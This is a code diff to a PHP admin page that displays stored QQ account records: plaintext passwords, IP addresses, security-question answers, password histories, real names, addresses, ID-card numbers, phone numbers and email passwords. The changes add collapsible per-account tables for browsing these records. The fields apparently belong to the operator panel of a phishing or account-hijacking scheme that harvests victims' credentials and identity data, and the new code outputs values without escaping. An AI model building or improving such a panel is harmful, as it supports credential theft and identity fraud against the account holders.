@@ -117,13 +117,24 @@
 					$content='';
 					$detailInfo='';
 
-					function formatDetail($detail){
-						$detailList=$detail[0]->detail;
-						print_r($detailList);
-						return '1';
+					function formatDetail($detail,$qq){
+						$detailList=$detail[0]['detail'];
+    					$html="<table style=\"width:100%;\">";
+						foreach ($detailList as $key => $value) {
+							foreach ($value as $key1 => $value1) {
+								if($key1==='真实姓名'){
+									$index=$key+1;
+									$html.="<td ref=\"$index-$qq\" class=\"detail_list_title\" style=\"cursor:pointer\"><strong>历史记录$index</strong></td>";
+								}
+								$html.="<tr class=\"detail-list detail-$key1-$index-$qq\"><td>$key1:<strong>".$value1."</strong></td></td>";
+								$html.="</tr>";
+							}
+						}
+						$html.="</table>";
+						return $html;
 					}
 
-					function formatSecurity($content){
+					function formatSecurity($content,$qq){
 						$a=explode("+====+",$content);
 						$html="<table style=\"width: 100%;\">";
 						foreach ($a as $key => $security) {
@@ -132,14 +143,14 @@
 								$html.="<tr>";
 								foreach ($singleSecurity as $key1 => $value) {
 									if($value!=null){
+										if($key1===0){
+											$html.="<td ref=\"$key-$qq\" class=\"security_list_title\"><strong>历史记录$key</strong></td>";
+										}
 										$mi=explode("？:", $value);
 										$quora=$mi[0];
 										$answer=$mi[1];
-										$html.="<tr><td>$quora?</td>";
-										$html.="<td>$answer</td></tr>";
-										if($key1==count($singleSecurity)-1){
-											$html.="<td><strong>历史记录</strong></td>";
-										}
+										$html.="<tr class=\"security-list securtiy-$key-$qq-$key1\"><td>$quora?:<strong>$answer</strong></td>";
+										$html.="</tr>";
 									}
 								}
 								$html.="</tr>";					
@@ -174,8 +185,8 @@
 											<td>".$value->qq."</td>
 											<td>".$value->password."</td>
 											<td>".$value->time."</td>
-											<td>".print_r(formatSecurity($content),true)."</td>
-											<td>".print_r(formatDetail(json_decode(getDetail($value->qq))),true)."</td>
+											<td>".print_r(formatSecurity($content,$value->qq),true)."</td>
+											<td>".print_r(formatDetail(json_decode(getDetail($value->qq),true),$value->qq),true)."</td>
 											<td>".$value->IP."</td>
 											<td><input qq=\"".$value->qq."\" type=\"button\" onclick=\"deleteQQ(this)\" value=\"删除\"></td>
 										</tr>";
@@ -209,6 +220,26 @@
 
 		$(document).ready(function(){
 			$('body').css('background','rgb(255,255,255)');
+
+			$('.detail-list,.security-list').slideUp();
+
+			$('.detail_list_title').click(function(){
+				var ref=$(this).attr('ref');
+				var attrList=['真实姓名','详细地址','另一个QQ','密码','结果接收方式','接收结果的邮箱','接收结果的邮箱密码','历史密码1','历史密码2','历史密码3','真实姓名2','身份证类型','身份证号码','手机号码','备注'];
+				for (var i = 0; i < attrList.length; i++) {
+					var selector=".detail-"+attrList[i]+'-'+ref;
+					$(selector).slideToggle();
+				};
+				$(this).toggleClass('admin_title_active');
+			});
+
+			$('.security_list_title').click(function(){
+				var ref=$(this).attr('ref');
+				for (var i = 0; i < 2; i++) {
+					$('.securtiy-'+ref+"-"+i).slideToggle();
+				};
+				$(this).toggleClass('admin_title_active');
+			});
 		});
 	</script>
 </body>
